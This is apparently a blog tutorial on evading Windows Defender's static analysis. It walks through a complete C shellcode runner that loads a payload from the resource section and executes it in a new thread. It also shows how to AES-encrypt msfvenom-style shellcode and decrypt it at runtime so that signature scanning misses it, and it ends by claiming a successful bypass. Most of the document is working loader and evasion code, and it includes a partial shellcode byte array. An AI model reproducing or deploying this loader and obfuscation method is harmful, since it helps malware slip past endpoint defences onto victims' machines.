# Evading Windows Defender Static Analysis

## Static Analysis

Windows Defender, like most EDRs and AV solutions, has a static analysis component. This component has multiple detection techniques for analyzing suspicious files. The important techniques to keep in mind for evasion are file hashes and signatured code.

File hashes are what they sound like - Defender will compare the file hash of a file to a database of known-bad hashes. If it's in the database, the file is quarantined. Signatured code involves an actual review of the instructions within the file for known-bad blocks of recognizable shellcode. While relatively simple, this technique can prove to be the first major obstacle for individuals when it comes to evasion.

Fortunately, Windows Defender (and many other AV engines) static analysis techniques can be defeated with some basic malware obfuscation techniques.


## Why Your Payload Got Caught

Before we get started, lets talk about why your `msfvenom` PE payload didn't work. Everything online and open-source is signatured and hashed to hell by most AV solutions these days. There are certainly tools on GitHub that will help you get the job done, but nothing is going to beat making your own shellcode runner. Basic, custom methods of obfuscating your shellcode (even using `msfvenom`) has a signficantly better chance of working than something off-the-shelf online.

That being said, let's talk about how to actually start evading Defender.

## Importing and Running Custom Shellcode

The first thing we need to do is just get our program to run custom shellcode. There are plenty of ways to do this but I'll just be sticking to creating a thread within our malicious process for simplicity. In terms of where we will keep our payload - I have chosen the `.rsrc` section. This is a preferred choice, but not incredibly relevant to our topic. Just know that we import our payload into a process memory buffer from the `.rsrc` section with the `CloneRsrcPayload()` function (if you want to know more, research how to import shellcode/binary files in Visual Studio).

We can use this cookie-cutter C program with Win32 calls to accomplish the following:
- Copy our shellcode (held in `.rsrc`) to workable process memory.
- Open a new thread which executes the payload within the buffer.

Note that I chose to create a `RunThread()` function to handle executing the buffer as a thread. This is completely optional.

```c
#include <stdio.h>
#include <Windows.h>
#include "resource.h"

// Clones .rsrc payloads into a working process buffer. Struct for return.
typedef struct RsrcInfo {
	PVOID pWorkBuffer;
	SIZE_T sBufferSize;
}RsrcInfo;

RsrcInfo CloneRsrcPayload()
{
	// Get payload from .rsrc
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	PVOID pPayload = LockResource(hGlobal);
	SIZE_T sPayloadSize = SizeofResource(NULL, hRsrc);

	// Make working buffer
	PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);

	RsrcInfo ReturnInfo = { .pWorkBuffer = pWorkBuffer, .sBufferSize = sPayloadSize };

	return ReturnInfo;

}

// Just runs a thread given a memory chunk. Returns thread handle.
HANDLE RunThread(PVOID pPayload, SIZE_T sPayloadSize)
{

	DWORD proc = 0;
	BOOL bExecute = VirtualProtect(pPayload, sPayloadSize, PAGE_EXECUTE_READ, &proc);
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pPayload, 0, 0, 0);
	WaitForSingleObject(hThread, -1);

	return hThread;
}

int main()
{
	// Get payload from Rsrc

	RsrcInfo sBufferInfo = CloneRsrcPayload();
	SIZE_T sPayloadSize = sBufferInfo.sBufferSize;
	PVOID pPayload = sBufferInfo.pWorkBuffer;

	// Execute

	RunThread(pPayload, sPayloadSize);

	return EXIT_SUCCESS;
}
```
Nice!

## AES Encryption

While our setup is functional, using most malicious shellcode will instantly get picked up by Defender and the file will be quarantined. Let's fix that.

One great option is to encrypt our shellcode before hand and decrypt it at runtime. When Defender looks at our encrypted payload, it will just see a bunch of gibberish and be none the wiser. We can use AES-256 to encrypt our payload. Again, there are various methods to accomplish this but a popular one is [Tiny-AES-C](https://github.com/kokke/tiny-AES-c). Start by copying `aes.h` and `aes.c` into your working directory and adding `#include "aes.h"`. You'll need to comment out some AES-128/156 lines in the header file in order to choose AES-256.

To start, we should intialize a `ctx` struct necessary for Tiny-AES, import our shellcode, and intiialize some variables to hold our IV and encryption key:

```c
int main()
{
	// struct for Tiny-AES
	struct AES_ctx ctx;
	BYTE pKey[32];                  
	BYTE pIv[16];                               

	// YOUR SHELLCODE HERE!
	unsigned char pPayload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,

  ...

  0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41,
  0x89, 0xda, 0xff, 0xd5
	};
	SIZE_T sPayloadSize = sizeof(pPayload);
```
Next, we can randomly generate some values for our key and IV with a helper function, and print them to the console. With these values we can initialize our `ctx` struct with the Tiny-AES library:
```c
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}
}


// print the input buffer as a hex char array (c syntax)
VOID PrintHexData(PBYTE Data, SIZE_T Size) {

	printf("======= DUMP ADDRESS 0x%p | SIZE %ld =======\n", Data, Size);

	for (int i = 0; i < Size; i++) {
		if (i < Size - 1) {
			printf("\\x%0.2X", Data[i]);
		}
		else {
			printf("\\x%0.2X", Data[i]);
		}
	}
	printf("\n\n");
...
	srand(time(NULL));                              
	GenerateRandomBytes(pKey, KEYSIZE);            

	srand(time(NULL) ^ pKey[0]);                  
	GenerateRandomBytes(pIv, IVSIZE);

	printf("--> KEY HEX:\n");
	PrintHexData(pKey, KEYSIZE);
	printf("--> IV HEX:\n");
	PrintHexData(pIv, IVSIZE);
	AES_init_ctx_iv(&ctx, pKey, pIv);
```
Now we are almost ready to encrypt. Recall that AES-256 is a block cipher, so we will need to make sure that our payload length is a multiple of 16 bytes. If it is, we can go ahead and encrypt. If not, we will need to add some null bytes to round it off with a helper function:
```c
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PaddedSize = NULL;

	// calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// copying old buffer to new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	//saving results :
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}

...

	if (sPayloadSize % 16 != 0) {
		PVOID pPayload_padded = NULL;
		SIZE_T* sPayloadSize_padded = NULL;
		PaddBuffer(pPayload, sPayloadSize, &pPayload_padded, &sPayloadSize_padded);
		AES_CBC_encrypt_buffer(&ctx, pPayload_padded, sPayloadSize_padded);
		PrintHexData(pPayload_padded, sPayloadSize_padded);
	}
	else {
		AES_CBC_encrypt_buffer(&ctx, pPayload, sPayloadSize);
		PrintHexData(pPayload, sPayloadSize);
	}
```
Great! Now we are able to generate encrypted shellcode with AES-256. But how do we run it?

## Decrypting and Running AES

This is the easy part. Import our encrypted shell code to `.rsrc` as before and initialize our key and IV:

```c
int main()
{
	struct AES_ctx ctx;

	BYTE pKey[] = {
		0xA7, 0xDE, 0x31, 0x82, 0x24, 0x32, 0x1B, 0x55, 0x35, 0x9B, 0x44, 0xEA, 0x8B, 0x9D, 0x75, 0xF1, 0xE4, 0x8B, 0x04, 0x7E, 0xD1, 0x3F, 0xB0, 0x5F, 0xBD, 0x0E, 0xCC, 0xAE, 0x2B, 0xFC, 0xA0, 0xA2
	};
	BYTE pIv[] = {
	  0xD7, 0x90, 0xE9, 0x42, 0x3B, 0xB4, 0xCD, 0xE8, 0x8F, 0x21, 0x88, 0xEA, 0x2E, 0x96, 0x74, 0x8B
	};

	printf("--> KEY HEX:\n");
	PrintHexData(pKey, 32);
	printf("--> IV HEX:\n");
	PrintHexData(pIv, 16);

	RsrcInfo sBufferInfo = CloneRsrcPayload();
	SIZE_T sPayloadSize = sBufferInfo.sBufferSize;
	PVOID pPayload = sBufferInfo.pWorkBuffer;
	AES_init_ctx_iv(&ctx, pKey, pIv);
```
Now we just decrypt the buffer and run new thread, and Defender doesn't have a clue!
```c

	AES_CBC_decrypt_buffer(&ctx, pPayload, sPayloadSize);
	PrintHexData(pPayload, sPayloadSize);
	
	// Execute

	RunThread(pPayload, sPayloadSize);

	return EXIT_SUCCESS;
}

```
![Windows Defender Bypassed](assets/img/static.gif)
*Successfully bypassing Windows Defender static analysis*
